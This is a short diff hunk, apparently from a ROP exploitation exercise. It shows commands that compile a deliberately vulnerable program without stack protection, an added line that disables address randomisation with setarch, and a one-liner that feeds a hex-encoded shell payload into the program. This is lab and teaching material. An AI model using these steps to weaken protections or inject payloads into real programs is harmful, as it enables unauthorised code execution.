@@ -83,6 +83,7 @@ return 0;
 
 gcc -o victim -fno-stack-protector victim.c.
 
+ setarch `arch` -R ./victim
 
  ((cat ropshell ; printf %080d 0 ; echo $a) | xxd -r -p ; cat ) | ./ropshell.
  
